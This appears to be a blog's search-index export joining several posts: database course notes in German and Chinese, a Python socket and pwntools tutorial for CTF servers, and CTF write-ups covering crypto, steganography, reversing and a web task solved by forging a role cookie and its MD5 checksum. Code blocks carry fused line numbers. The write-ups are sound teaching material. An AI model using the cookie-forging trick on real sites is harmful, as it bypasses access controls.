in BCNF-Relationen zerlegen, aber nicht unbedingt abhägigkeitserhaltend. Dekompositions-Algorithmus Mehrwertige Abhägigkeit (Multivalued Dependency, MVD): 2行对上，2行交叉对应 Jede FD is auch eine MVD: Eine MVD ist trivial iff: oder Vierte Normalform (4NF): falls für jede MVD eine der folgenden gilt: Die MVD ist trivial oder ist Superschlüssel von R 6. Physische DatenorganisationSpeicherhierarchieRegister Cache Hauptspeicher Plattenspeicher Archivspeicher RAIDRedundant Arrays of Independent Disks MTTF, MTTR, MTTDL RAID 0: Striping RAID 1: Spiegelung RAID 0+1(10): Striping und Spiegelung RAID 2: Striping auf Bit-Ebene RAID 3: Striping auf Bit-Ebene mit Paritätsinfo RAID 4: Striping von Blöcken RAID 5: Striping von Blöcken, Verteilung der Paritätsblöcke IndexstrukturenB-BäumeB+-BäumeErweiterbares HashingDynamisches Wachsen möglich Beispiel: gespiegelte binäre PersNr h(004) = 00100000… (4=0…0100) h(006) = 01100000… (6=0…0110) h(048) = 00001100… (48=0…0110000) Globale Tiefe Lokale Tiefe R-Baummehrdimensionalen Zugriffsstrukturen 7. AnfragebearbeitungLogische OptimierungKanonische Übersetzung: SQL Relationale Algebra Äquivalenzerhaltende Transformationsregeln 一共12条 Dependent Join Physische OptimierungNested Loop Joinforeach : ​ foreach : ​ if s.a=r.a then Res:= Res (r s) O(N*M) Block-Nested Loop Algorithmusforeach Block ​ foreach ​ foreach ​ if s.b = r.a then Res:= Res (r s) O(N * M/B) (M/B: Anzahl der Blöcke) Index-JoinVoraussetzung: 其中一个表是sortiert的且有B-Baum O(N * log(M)) Merge-JoinVoraus.: 2个表都是sortiert的 O(N+M) linear Hash-Join选定一个哈希函数h()，计算R.A的值，分配到hash buckets里，然后再计算S.B的值，在哈希桶里匹配。 不需要预先排序 Partitionieren und Hashing的话需要2个哈希函数。 O(N+M) linear Join mit Hashfilter (Bloom-Filter)需要很多个（k个）不同的哈希函数forall : 计算h_i(a) forall 0覆盖1。 会出现False Positive，但是不会出现False Negative Externes SortierenSelektivität Dynamische Programmierung: Phase: Zugriffspläne ermitteln Phase: Join-Pläne ermittel (2-fach, …, n-fach) Phase: Finalisierung 8. TransaktionsverwaltungBegin of Transaction (BOT)：转账开始的标志 read：读存款 write：写入（修改存款，出账入账） commit：转账结束，所有操作festschreiben abort：取消转账，所有状态复原 define savepoint backup transaction: Auf den jüngsten Sicherungspunkt zurücksetzen. commit work rollback work: Alle Änderungen sollen zurückgesetzt werden. ACID: Atomicity (Atomarität)：原子性。 Alles oder Nichts. Consistency：一致性。 Isolation：隔离性。 Durability (Dauerhaftigkeit)：持久性。 所有更改都必须永久存储。Änderungen erfolgreicher Transaktionen dürfen nie verloren gehen. 9. Fehlerbehandlung (Recovery)Fehlerklassifikation Lokaler Fhler in einer noch nicht festgeschriebenen Transaktion Wirkung zurücksetztenR1-Recovery Fehler mit Hauptspeicherverlust Abgeschlossene TAs erhalten bleiben R2-Recovery redo Noch nicht abgeschlossene TAs zurücksetzten R3-Recovery undo Fehler mit Hintergrundspeicherverlust R4-Recovery steal：未提交的事务修改的页面不会被替换。 steal：允许替换缓存中的任何非固定页面。 force：事务提交时立即将数据写入磁盘。 force：修改的数据仍可保留在缓存中，提高性能。 Auswirkung auf Recovery: force force steal - Kein Undo- Kein Redo - Kein Undo- Redo steal - Undo- Kein Redo - Undo- Redo Einbringungsstrategie（数据提交策略）: Update in Place：直接覆盖 Twin-Block-Verfahren：复制整个数据块 Schattenspeicherkonzept：复制修改的页面 Log-Einträge: LSN (Log Sequence Number)：日志序列号 Transaktionskennung(TA_ID) PageID Redo：纪录当前操作（比如说+=50） Undo：当前操作的逆向（比如-=50） PrevLSN：上一个日志记录的指针 [LSN, TransaktionsID, PageID, Redo, Undo, PrevLSN] （中括号） Protokollierung: Physische Protokollierung before-image：修改前的Zustand after-image Logische Protokollierung Undo-Code Redo-Code Log-Information会记录2次以上： Log-Datei R1,R2,R3 Log-Archiv R4 WAL-Prinzip (Write Ahead Log)： Commit前，确保所有相关的日志记录已写入日志文件。 modifizierte Seite auslagern前，确保相关日志记录已写入日志存档（Log-Archiv）。 Winner：在崩溃前已经完成，需要Redo Loser：在崩溃时仍然处于未提交状态，需要Undo Wiederanlauf: Analyse Log-Datei analysieren Winner-Menge ermitteln Loser-Menge ermitteln Redo Undo CLR: Compensating Log Record 用于记录撤销的操作。（给undo的） 简单来说就是为了预防恢复崩溃时发生的其他崩溃。 CLR-Einträge: LSN (Log Sequence Number)：日志序列号 Transaktionskennung(TA_ID) PageID Redo： PrevLSN：上一个日志记录的指针 UndoNxtLSN：Verweis auf die nächste rückgängig zu machende Änderung （尖括号） 注意：CLR没有undo信息。 3种Sicherungspunkte(-Qualitäten)： transaktionskonsistent （事务一致） 所有已提交的事务都被完全存储，未提交的都没有被写入磁盘。（只在所有活跃事务完成后进行检查点记录） aktionskonsistent （操作一致） 可能包含未提交的事务，但是所有操作都是完整的。 unscharf (fuzzy) 修改的页面不会立即写入磁盘，只记录“脏页”的信息，而不是数据本身 DirtyPages (Menge der modifizierten Seiten, 尚未写入磁盘), MinDirtyPageLSN, MinLSN R4-Recovery 10. MehrbenutzersynchronisationFehler (bei unkontroliertem Mehrbenutzerbetrieb): Lost Update: Verlorengegangene Änderungen Dirty Read: Abhängigkeit von nicht freigegebenen Änderungen Phantomproblem HistorieSeiralisierbarkeit 2 Historien äquivalent: wenn sie die Konfliktoperationen der nicht abgebrochenen Transaktionen in derselben Reihenfolge ausführen. SR: Eine Historie ist serialisierbar wenn sie äquivalent zu einer seriellen Historie Hs ist. Eine Historie H serialisierbar der zugehörige Serialisierbarkeitsgraph SG(H) azyklisch ist. liest von in der Historie H RC: rücksetzbare Historie kaskadierendes Rücksetzen (Cascading Rollback)： 假如T2读取了T1里被修改过但是还未被提交（commit）的数据，那么当T1 abort的时候，也需要abort T2。 ACA: Historien ohne kaskadierendes Rücksetzen (avoiding cascading abort) ST: Strikte Historien 想要对一个被修改过的对象进行操作前，必须要确保其已经被commit或者abort了。 Sperrbasierte Synchronisation （锁）Sperrmodi: S (shared, read lock) 允许多个事务（Transaktion）同时读取数据，但不能进行写操作。 X (exclusive, write lock) 允许事务对数据进行读取和写入，但其他事务不能同时访问该数据。 Verträglichkeitsmatrix / Kompatibilitätsmatrix: NL S X S ✅（兼容） ✅ ❌ X ✅ ❌（不兼容） ❌ Zwei-Phasen-Sperrprotokoll: Wachstumsphase：只获取锁 Schrumpfphase：只释放锁 Strenges Zwei-Phasen-Sperrprotokoll: 所有锁直到事务提交（commit）或回滚（abort）后才释放，避免级联回滚。 Verklemmungen (Deadlocks) Erkennung: Wartegraph Vermeidung: Preclaiming durch Zeitstempel Wound-Wait Strategie Wait-Die Strategie Multi-Granularity Locking (MGL) Phantomproblem: Zugriffsweg sperren Zeitstempel-basierende SynchronisationreadTS(A)：上次读取 A的时间戳。 writeTS(A)：上次写入 A 的时间戳。 Synchronisationsverfahren: 当 Ti 试图读取数据 A (ri(A))： 若 TS(Ti)&lt;writeTS(A)，则 Ti必须被回滚（因为 AAA 可能已被更新）。 否则，Ti可以继续读取，并更新 readTS(A) = max(TS(Ti), readTS(A))。 当 Ti 试图写入数据 A (wi(A))： 若 TS(Ti)&lt;readTS(A)，说明在 Ti之前已经有其他事务读取了 A，则 Ti 必须回滚。 若 TS(Ti)&lt;writeTS(A)，说明 Ti 试图覆盖一个更新的值，必须回滚。 否则，Ti可以写入，并更新 writeTS(A) = TS(Ti)。 Optimistische Synchronisation Lesephase Validierungsphase（验证） Schreibphase Snapshot Isolation Synchronisation von Indexstrukturen: zu aufwendig, redundante Transaktionsverwaltung in SQL92isolation level: read uncommited read commited repeatable read serializable","categories":[{"name":"TUM课程笔记","slug":"TUM课程笔记","permalink":"https://archer-baiyi.github.io/categories/TUM%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/"},{"name":"Dantenbank 数据库","slug":"TUM课程笔记/Dantenbank-数据库","permalink":"https://archer-baiyi.github.io/categories/TUM%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/Dantenbank-%E6%95%B0%E6%8D%AE%E5%BA%93/"}],"tags":[{"name":"SQL","slug":"SQL","permalink":"https://archer-baiyi.github.io/tags/SQL/"},{"name":"Datenbank","slug":"Datenbank","permalink":"https://archer-baiyi.github.io/tags/Datenbank/"},{"name":"Database","slug":"Database","permalink":"https://archer-baiyi.github.io/tags/Database/"},{"name":"数据库","slug":"数据库","permalink":"https://archer-baiyi.github.io/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/"}]},{"title":"与服务器的交互","slug":"CTF/与服务器的交互","date":"2025-03-10T19:22:29.000Z","updated":"2025-03-31T12:45:34.302Z","comments":true,"path":"2025/03/10/CTF/与服务器的交互/","permalink":"https://archer-baiyi.github.io/2025/03/10/CTF/%E4%B8%8E%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%9A%84%E4%BA%A4%E4%BA%92/","excerpt":"使用socket.socket()与remote（）连接服务器","text":"socket.socketsocket 是 Python 标准库中的模块，用于进行 TCP/UDP 连接。 假设服务器地址是 example.com，端口是 1234： 123456789101112131415161718192021import socket# 1. 创建一个TCP sockets = socket.socket()# 2. 连接远程服务器# connect的参数要求为一个tupels.connect((&quot;example.com&quot;, 1234))# 3. 发送数据（例如发送 &quot;Hello&quot;）# sendall() 默认发送的是 bytes 类型的数据，所以需要 b&quot;&quot; 或者 &quot;&quot;.encodes.sendall(b&quot;Hello\\n&quot;)# 4. 接收服务器返回的数据# 这个参数按需调节就好data = s.recv(1024) # 一次接收 1024 字节print(&quot;Received:&quot;, data.decode())# 5. 关闭连接s.close() 如果服务器会发送非常多的内容，则需要一直循环接收服务器发送的消息： 123456789101112131415161718192021import sockets = socket.socket()s.connect((&quot;example.com&quot;, 1234))# 持续接收数据，直到服务器关闭连接data = b&quot;&quot; # 用于存储完整的接收数据while True: part = s.recv(1024) # 每次读取 1024 字节 if not part: # 如果 part 为空，表示服务器关闭连接 break data += part # 累加数据# 按行分割并逐行打印lines = data.decode().splitlines()for line in lines: print(line)s.close() 也可以使用time.sleep()来确保收到完整信息： 12345678910111213141516import socketimport times = socket.socket()s.connect((&quot;example.com&quot;, 1234))s.sendall(b&quot;Hello\\n&quot;)time.sleep(0.5)data = s.recv(1024)print(&quot;Received:&quot;, data.decode())s.close() SSL连接 SSL 连接会比普通的TCP连接（socket.socket()）多一步加密的步骤 123456789101112131415161718import socketimport sslsock = socket.socket()# 使用 SSL 加密 sockets = ssl.wrap_socket(sock)s.connect((&quot;example.com&quot;, 1234))s.sendall(b&quot;Hello\\n&quot;)data = s.recv(1024)print(&quot;Received:&quot;, data.decode())s.close() pwntools的remotepwntools 是专门为 Pwn 题目设计的 Python 库，封装了 socket。 123456789101112131415from pwn import *# 1. 连接服务器r = remote(&quot;example.com&quot;, 1234)# 2. 发送数据r.sendline(b&quot;Hello&quot;) # 自动添加 &#x27;\\n&#x27;# 3. 接收数据response = r.recvall() # 读取所有信息# response = r.recvline() # 读取一整行print(&quot;Received:&quot;, response.decode())# 4. 关闭连接r.close() 比起socket，pwn拥有更高级的功能： 12345678910r.recvuntil(b&quot;\\n&quot;) #一直读数据，直到匹配特定字符串。# p.recvuntil(b&quot;Enter your name:&quot;)r.interactive() # 进入交互模式#比如说在pwn的题目里如果成功打开了shell（system(&quot;/bin/sh&quot;)），进入交互模式则可以直接手动执行命令。response = r.recvall()# recvall会自动读取所有可用数据 直到服务器关闭连接。不再需要像原生 socket 那样手写 while True 循环。r.sendafter(b&quot;input:&quot;, b&quot;1234&quot;) # 先等待服务器发送 input:，然后再发送 1234 remote() 里也可以启用 SSL： 12345678910from pwn import *r = remote(&quot;example.com&quot;, 1234, ssl=True) # 开启 SSL 加密r.sendline(b&quot;Hello&quot;) # 自动添加 &#x27;\\n&#x27;response = r.recvline()print(&quot;Received:&quot;, response.decode())r.close() 总的来说，在做CTF题目时，pwn的remote可以完成所有与服务器的交互。 socket.socket没有的remote有，socket.socket没有的remote也有。","categories":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/categories/CTF/"}],"tags":[{"name":"socket","slug":"socket","permalink":"https://archer-baiyi.github.io/tags/socket/"},{"name":"remote","slug":"remote","permalink":"https://archer-baiyi.github.io/tags/remote/"}]},{"title":"Bronco CTF Write Up","slug":"CTF/Writeup/Bronco-CTF-Write-Up","date":"2025-03-10T12:28:52.000Z","updated":"2025-03-25T19:31:22.365Z","comments":true,"path":"2025/03/10/CTF/Writeup/Bronco-CTF-Write-Up/","permalink":"https://archer-baiyi.github.io/2025/03/10/CTF/Writeup/Bronco-CTF-Write-Up/","excerpt":"Bronco CTF比赛的题解，涉及方向：Crypto, Web, Reverse, Steg, Misc, Forensics","text":"BeginnerBreak the Battalion 这道题我们会拿到一份ELF文件，我们用IDA打开它会看到 可以发现，这个程序的核心内容是encrypt，所以我们查看一下它的内容： 写一段python便可以简单得知输入什么内容最后会输出“brigade”： 12345678def decrypt(encrypted): return &#x27;&#x27;.join(chr(ord(c) ^ 0x50) for c in encrypted)encrypted = &quot;brigade&quot;original_input = decrypt(encrypted)print(f&quot;Original input: &#123;original_input&#125;&quot;)# Original input: 2&quot;97145 所以flag为： 1bronco&#123;2&quot;97145&#125; (吐槽一下，这个flag的内容真的非常奇怪，一般都是会带点正常单词的。) Simon Says 这道题我们会拿到这样一张图片： 并没有任何有用的内容。根据题目描述我们猜测这道题用了LSB隐写，所以用Stegsolve打开图片便可得到： flag为： 1bronco&#123;simon_says_submit_this_flag&#125; Too Many Emojis这道题我们会得到一串emoji内容： 因为知道flag的格式为bronco{}，所以可以确定这个应该是单表加密，并且知道前6个emoji对应的明文。 经过一系列搜索与排查可以发现每一个emoji对应的字母为这个emoji的官方英文名的首字母，根据这个线索我们可以通过找到的这些信息来解密内容： （用到的网站：https://unicode.org/emoji/charts/full-emoji-list.html） 这里有一个小技巧：如果找不到想要的 emoji，可以描述给 ChatGPT 并询问其官方名称，再到网站上用名称（或部分名称）搜索，确认是否是我们需要的。 最后得到flag： 1bronco&#123;emojis_express_my_emotions&#125; Straight Up Circular 这道题给出的加密字符串如下： 1dvlby_otspnr&#123;cobrnot450i1nm_e03&#125; 首先，通过 &#123;&#125; 的位置，我们可以判断这并不是替换加密。其次，我们发现 bronco&#123;&#125;（该比赛的 flag 统一格式）中的每个字母和符号都出现在了这串字符串中，因此很可能是某种乱序加密。 先确定 b、r、o 等字母在加密字符串中的具体位置，再根据题目名字（Straight Up Circular）不难发现这个用这个规律可以得到的flag开头： 从字符串正中间的 b 出发 先向右移动 1 位 再向左移动 2 位 接着向右移动 3 位 依此类推…… 继续这个流程便可以成功获得flag： 1bronco&#123;tr4n5p0sit1on_my_bel0v3d&#125; CryptoAcross the Tracks 我们会得到一段内容： 1Samddre··ath·dhf@_oesoere·ebun·yhot·no··oso·i·a·lr1rcm·iS·aruf·toibadhn·nadpikudynea&#123;l_oeee·ch·oide·f·n·aoe·sae·aonbdhgo_so·rr.i·tYnl·s·tdot·xs·hdtyy&#x27;·.t·cfrlca·epeo·iufiyi.t·yaaf·.a.·ts··tn33&#125;i·tvhr·.tooho···rlmwuI·h·e·iHshonppsoleaseecrtudIdet.·n·BtIpdheiorcihr·or·ovl·c··i·acn·t·su··ootr·:b3cesslyedheIath·e·_ 根据题目描述我们猜测这段内容使用了栅栏密码，并且key为题目描述中提到的“tenth”（10）。解密即可得到flag： 1bronco&#123;r@1l_f3nc3_cip3rs_r_cool&#125; Rahhh-SA 这道题我们会得到以下内容： 1234e = 65537n = 3429719c = [-53102, -3390264, -2864697, -3111409, -2002688, -2864697, -1695722, -1957072, -1821648, -1268305, -3362005, -712024, -1957072, -1821648, -1268305, -732380, -2002688, -967579, -271768, -3390264, -712024, -1821648, -3069724, -732380, -892709, -271768, -732380, -2062187, -271768, -292609, -1599740, -732380, -1268305, -712024, -271768, -1957072, -1821648, -3418677, -732380, -2002688, -1821648, -3069724, -271768, -3390264, -1847282, -2267004, -3362005, -1764589, -293906, -1607693]p = -811 首先注意到c的所有内容都是负数，但是其绝对值都小于等于n，所有猜测将其直接放进 $\\mathbb{Z}/n\\mathbb{Z}$ 进行计算即可。但因为发现$p’ := n+p = 3,428,908$ 并不是n的因数，所以尝试 $3429719/811=4229$ ，发现结果为整数。 所以写一段python代码来尝试RSA解码即可： 1234567891011121314151617181920212223242526272829303132333435363738394041#!/usr/bin/env python3e = 65537n = 3429719p = 811 # 题中写的是 -811，这里只取绝对值q = n // p # 4229# 计算 phi(n)phi = (p - 1) * (q - 1) # (811 - 1)*(4229 - 1) = 810*4228 = 3424680# 求 d = e^-1 mod phi(n)# Python 3.8+ 可以直接用 pow(e, -1, phi) 得到模逆d = pow(e, -1, phi)# 给出的负数密文c_list = [ -53102, -3390264, -2864697, -3111409, -2002688, -2864697, -1695722, -1957072, -1821648, -1268305, -3362005, -712024, -1957072, -1821648, -1268305, -732380, -2002688, -967579, -271768, -3390264, -712024, -1821648, -3069724, -732380, -892709, -271768, -732380, -2062187, -271768, -292609, -1599740, -732380, -1268305, -712024, -271768, -1957072, -1821648, -3418677, -732380, -2002688, -1821648, -3069724, -271768, -3390264, -1847282, -2267004, -3362005, -1764589, -293906, -1607693]# 解密plaintext_nums = []for c in c_list: # 先把负数转为 mod n 内的非负代表元 c_mod = c % n m = pow(c_mod, d, n) plaintext_nums.append(m)message = &#x27;&#x27;.join(chr(m) for m in plaintext_nums)print(&quot;解密后得到的数值:&quot;, plaintext_nums)print(&quot;尝试映射到字符后的结果:&quot;)print(message)# bronco&#123;m4th3m4t1c5_r34l1y_1s_qu1t3_m4g1c4l_raAhH!&#125; WebGrandma’s Secret Recipe （因为这份食谱离婚了实在是有点抽象） 点击网站可以看到： 点开Cookie可以发现有2条内容： 12checksum: a223befb6660a23f9c3491f74ef84e43role: &quot;kitchen helper&quot; 结果检查发现checksum为role的md5结果： 所以我们将role改为：”grandma”，并且将checksum改为a5d19cdd5fd1a8f664c0ee2b5e293167（=md5(grandma))。点击“Grandma’s Pantry“便可以看到： 得到flag： 1bronco&#123;grandma-makes-b3tter-cookies-than-girl-scouts-and-i-w1ll-fight-you-over-th@t-fact&#125; ReverseReversing for Ophidiophiles 这道题我们会得到以下内容： 123a326c27bee9b40885df97007aa4dbe410e93 1234567891011121314flag = input()carry = 0key = &quot;Awesome!&quot;output = []for i,c in enumerate(flag): val = ord(c) val += carry val %= 256 val ^= ord(key[i % len(key)]) output.append(val) carry += ord(c) carry %= 256print(bytes(output).hex()) 直接用python写一段逆向的算法便可以得到flag： 123456789101112131415encrypted_hex = &quot;23a326c27bee9b40885df97007aa4dbe410e93&quot;encrypted_bytes = bytes.fromhex(encrypted_hex)carry = 0key = &quot;Awesome!&quot;flag = []for i, val in enumerate(encrypted_bytes): val ^= ord(key[i % len(key)]) # 逆向 XOR 操作 val = (val - carry + 256) % 256 # 逆向 carry 计算 flag.append(chr(val)) carry = (carry + val) % 256 # 重新计算 carry 值print(&quot;&quot;.join(flag))# bronco&#123;charge_away&#125; theflagishere! 这道题我们会得到一份Python 编译后的字节码文件 “theflagishere.pyc”，我们首先用这个网站将其反汇编： https://www.lddgo.net/string/pyc-compile-decompile 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129# Visit https://www.lddgo.net/string/pyc-compile-decompile for more information# Version : Python 3.9def what_do_i_do(whoKnows): a_st = &#123; &#125; for a in whoKnows: if a_st.get(a) == None: a_st[a] = 1 continue a_st[a] += 1 variable_name = 0 not_a_variable_name = &#x27;None&#x27; for a in a_st: if a_st[a] &gt; variable_name: not_a_variable_name = a variable_name = a_st[a] continue return (not_a_variable_name, variable_name)def char_3(): return &#x27;m&#x27;def i_definitely_return_the_flag(): def notReal(): def actually_real(): return &#x27;actuallyaflag&#x27; return actually_real def realFlag(): return &#x27;xXx___this__is_the__flag___xXx&#x27; return (realFlag, notReal)def i_am_a_function_maybe(param): variableName = (param + 102) * 47 for i in range(0, 100): variableName *= i + 1 variableName /= i + 1 newVariable = variableName * i newVariable += 100 return chr(ord(chr(int(variableName) + 1)))def i_do_not_know(): realFlagHere = &#x27;br0nc0s3c_fl4g5_4r3_345y&#x27; return &#x27;long_live_long_flags&#x27;def unrelated_statement(): return &#x27;eggs_go_great_with_eggs&#x27;def i_am_a_function(param): variableName = (param + 102) * 47 for i in range(0, 100): variableName *= i + 1 newVariable = variableName * i newVariable += 100 variableName /= i + 1 return chr(ord(chr(int(variableName))))def i_return_a_helpful_function(): def i_do_something(char): var = [] for i in range(54, 2000): var.append(ord(char) / 47 - 102) var.reverse() return var.pop() return i_do_somethingdef i_return_the_flag(): return &#x27;thisisdefinitelytheflag!&#x27;def i(): return &#x27;free_flag_f&#x27;def char_0(): return i_am_a_function_maybe(i_return_a_helpful_function()(what_do_i_do(i_return_the_flag())[0]))def char_1_4_6(): return i_am_a_function_maybe(i_return_a_helpful_function()(what_do_i_do(i_definitely_return_the_flag()[0]())[0]))def char_2_5_9(): return i_am_a_function_maybe(i_return_a_helpful_function()(what_do_i_do(i_definitely_return_the_flag()[1]()())[0]))def char_7(): return i_am_a_function_maybe(i_return_a_helpful_function()(what_do_i_do(interesting()()()()())[0]))def char_8(): return i_am_a_function_maybe(i_return_a_helpful_function()(what_do_i_do(i_do_not_know())[0]))def char_10(): return i_am_a_function_maybe(i_return_a_helpful_function()(what_do_i_do(unrelated_statement())[0]))def interesting(): def notinteresting(): def veryuninteresting(): def interesting_call(): return i return interesting_call return veryuninteresting return notinteresting 然后用python写一段逆向的脚本即可得到flag （主要内容其实就是复制粘贴）： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105def what_do_i_do(whoKnows): a_st = &#123;&#125; for a in whoKnows: if a_st.get(a) is None: a_st[a] = 1 continue a_st[a] += 1 variable_name = 0 not_a_variable_name = &#x27;None&#x27; for a in a_st: if a_st[a] &gt; variable_name: not_a_variable_name = a variable_name = a_st[a] return (not_a_variable_name, variable_name)def i_definitely_return_the_flag(): def notReal(): def actually_real(): return &#x27;actuallyaflag&#x27; return actually_real def realFlag(): return &#x27;xXx___this__is_the__flag___xXx&#x27; return (realFlag, notReal)def i_do_not_know(): realFlagHere = &#x27;br0nc0s3c_fl4g5_4r3_345y&#x27; return &#x27;long_live_long_flags&#x27;def unrelated_statement(): return &#x27;eggs_go_great_with_eggs&#x27;def interesting(): def notinteresting(): def veryuninteresting(): def interesting_call(): return i return interesting_call return veryuninteresting return notinterestingdef i(): return &#x27;free_flag_f&#x27;def i_return_a_helpful_function(): def i_do_something(char): var = [] for i in range(54, 2000): var.append(ord(char) / 47 - 102) var.reverse() return var.pop() return i_do_somethingdef i_am_a_function_maybe(param): variableName = (param + 102) * 47 for i in range(0, 100): variableName *= i + 1 variableName /= i + 1 newVariable = variableName * i newVariable += 100 return chr(ord(chr(int(variableName) + 1)))def char_0(): return i_am_a_function_maybe(i_return_a_helpful_function()(what_do_i_do(i_return_the_flag())[0]))def char_1_4_6(): return i_am_a_function_maybe(i_return_a_helpful_function()(what_do_i_do(i_definitely_return_the_flag()[0]())[0]))def char_2_5_9(): return i_am_a_function_maybe(i_return_a_helpful_function()(what_do_i_do(i_definitely_return_the_flag()[1]()())[0]))def char_3(): return &#x27;m&#x27;def char_7(): return i_am_a_function_maybe(i_return_a_helpful_function()(what_do_i_do(interesting()()()()())[0]))def char_8(): return i_am_a_function_maybe(i_return_a_helpful_function()(what_do_i_do(i_do_not_know())[0]))def char_10(): return i_am_a_function_maybe(i_return_a_helpful_function()(what_do_i_do(unrelated_statement())[0]))def i_return_the_flag(): return &#x27;thisisdefinitelytheflag!&#x27;# 拼接 flagflag = ( char_0() + char_1_4_6() + char_2_5_9() + char_3() + char_1_4_6() + char_2_5_9() + char_1_4_6() + char_7() + char_8() + char_2_5_9() + char_10())print(&quot;Recovered flag:&quot;, flag)# i_am_a_flag# bronco&#123;i_am_a_flag&#125; ForensicsQR Coded 这道题我们会得到一张二维码： 直接扫描（https://scanqr.org/）会得到一个fake flag： 用Stegsolve打开并调整到Gray bits会得到另外一张二维码： 扫描后会得到真正的flag： 1bronco&#123;th1s_0n3_i5&#125; Uno 这道题我们会得到这样一张图片： 根据题目描述（”a significant bit of the cards were left on the plane I was on.“）我们猜测这道题用的是LSB隐写了ASCII码，所以我们用StegSolve打开图片，利用其Data Extract模块进行查看。这个模块可以查看RGB三种颜色的每一个通道，并且按照（自选的）一定的排列顺序显示每个通道的Hex和ASCII码字符： 最后，根据题目描述中的 “the numbers really speak to me…” 这一句，尝试各种由 2、3、4、5 组成的组合，便可以得到 flag： 1bronco&#123;no_un0_y3t&#125; Wordlands 我们会得到这张图片： 经过一番尝试后，当用StegSolve打开图片，利用其Data Extract模块进行查看时可以发现： 8BPS是标准的Photoshop 的.psd 文件有固定的文件头，所以我们点击“Save Bin”将其存为wordlands.psd，并用这个网站打开它： https://www.photopea.com/ 可以发现这里有所有图片创作的信息（图层之类的）。最后根据line的图层的顺序进行拼接便可以得到flag： 比如说Shape1这个图层里的线连接了b和r，表示开头为br 然后是(b)ro，以此类推… 1bronco&#123;i_love_admiring_beautiful_winter_landscapes&#125; MiscTick Tock 这道题我们首先会得到这张图片： 经过多次尝试可以在StegSolve的Data Extract模块里发现有一长串由“tick”和“tock”组成的内容： 1ticktocktocktockticktickticktock ticktocktocktickticktocktocktock ticktocktocktickticktockticktick ticktocktockticktickticktocktock ticktocktocktocktickticktocktick ticktocktocktickticktockticktick ticktocktocktocktockticktocktock ticktocktocktockticktockticktock ticktocktocktocktocktickticktick ticktocktockticktockticktocktock ticktocktocktockticktockticktick ticktockticktocktocktocktocktock ticktocktockticktickticktocktick ticktocktocktocktocktickticktick ticktocktockticktickticktocktock ticktocktockticktockticktocktick ticktocktockticktocktickticktock ticktocktocktockticktockticktick ticktocktockticktocktickticktick ticktockticktocktocktocktocktock ticktocktockticktockticktocktick ticktocktockticktickticktocktock ticktocktockticktocktickticktock ticktocktocktocktocktickticktick ticktocktocktickticktickticktock ticktockticktocktocktocktocktock ticktocktockticktickticktocktick ticktocktocktocktocktickticktick ticktocktocktocktickticktocktock ticktocktockticktickticktocktock ticktocktocktocktocktickticktick ticktocktocktockticktocktocktick ticktocktocktockticktocktocktock ticktocktockticktocktickticktock ticktocktocktocktocktockticktock 写一段python将tick替换成0，tock替换成1然后当成二进制内容进行解码会得到： 1234567891011121314151617def ticktock_to_binary(text): return text.replace(&quot;tick&quot;, &quot;0&quot;).replace(&quot;tock&quot;, &quot;1&quot;)text = &quot;ticktocktocktockticktickticktock ticktocktocktickticktocktocktock ticktocktocktickticktockticktick ticktocktockticktickticktocktock ticktocktocktocktickticktocktick ticktocktocktickticktockticktick ticktocktocktocktockticktocktock ticktocktocktockticktockticktock ticktocktocktocktocktickticktick ticktocktockticktockticktocktock ticktocktocktockticktockticktick ticktockticktocktocktocktocktock ticktocktockticktickticktocktick ticktocktocktocktocktickticktick ticktocktockticktickticktocktock ticktocktockticktockticktocktick ticktocktockticktocktickticktock ticktocktocktockticktockticktick ticktocktockticktocktickticktick ticktockticktocktocktocktocktock ticktocktockticktockticktocktick ticktocktockticktickticktocktock ticktocktockticktocktickticktock ticktocktocktocktocktickticktick ticktocktocktickticktickticktock ticktockticktocktocktocktocktock ticktocktockticktickticktocktick ticktocktocktocktocktickticktick ticktocktocktocktickticktocktock ticktocktockticktickticktocktock ticktocktocktocktocktickticktick ticktocktocktockticktocktocktick ticktocktocktockticktocktocktock ticktocktockticktocktickticktock ticktocktocktocktocktockticktock&quot;text = text.replace(&quot; &quot;, &quot;&quot;)binary = ticktock_to_binary(text)print(binary)# 01110001 01100111 01100100 01100011 01110010 01100100 01111011 01110101 01111000 01101011 01110100 01011111 01100010 01111000 01100011 01101010 01101001 01110100 01101000 01011111 01101010 01100011 01101001 01111000 01100001 01011111 01100010 01111000 01110011 01100011 01111000 01110110 01110111 01101001 01111101content = &#x27;&#x27;.join(chr(int(binary[i:i+8], 2)) for i in range(0, len(binary), 8))print(content)# qgdcrd&#123;uxkt_bxcjith_jcixa_bxscxvwi&#125; 最后通过遍历凯撒密码便可以得到flag： 1bronco&#123;five_minutes_until_midnight&#125; 比赛官方GitHubhttps://github.com/SCUBroncoSec/BroncoCTF-2025-Public","categories":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/categories/CTF/"},{"name":"writeup","slug":"CTF/writeup","permalink":"https://archer-baiyi.github.io/categories/CTF/writeup/"}],"tags":[{"name":"writeup","slug":"writeup","permalink":"https://archer-baiyi.github.io/tags/writeup/"}]},{"title":"X3ctf2025 Write Up","slug":"CTF/Writeup/X3ctf2025-Write-Up","date":"2025-03-10T12:25:08.000Z","updated":"2025-03-29T19:01:01.170Z","comments":true,"path":"2025/03/10/CTF/Writeup/X3ctf2025-Write-Up/","permalink":"https://archer-baiyi.github.io/2025/03/10/CTF/Writeup/X3ctf2025-Write-Up/","excerpt":"x3ctf比赛的题解，涉及方向：Misc, Crypto","text":"Miscp11n-trophy（签到题）:题目描述： 我们首先会得到这样一份证书： 第一题签到题的答案就是证书下面正中间的“This certificate does not grant the rank of Master”。 trophy-plus + trophy-plus64:这两道目描述一模一样 其中一个flag是藏在certificate周围一圈的位置： 人工将这些内容识别，再翻译成二进制然后解码就会得到flag 1234567891011121314151617181920212223242526272829303132def decode_binary(content, mapping): # Convert content to binary using the mapping binary_str = &#x27;&#x27;.join(mapping[char] for char in content if char in mapping) # Split the binary string into 8-bit chunks bytes_list = [binary_str[i:i+8] for i in 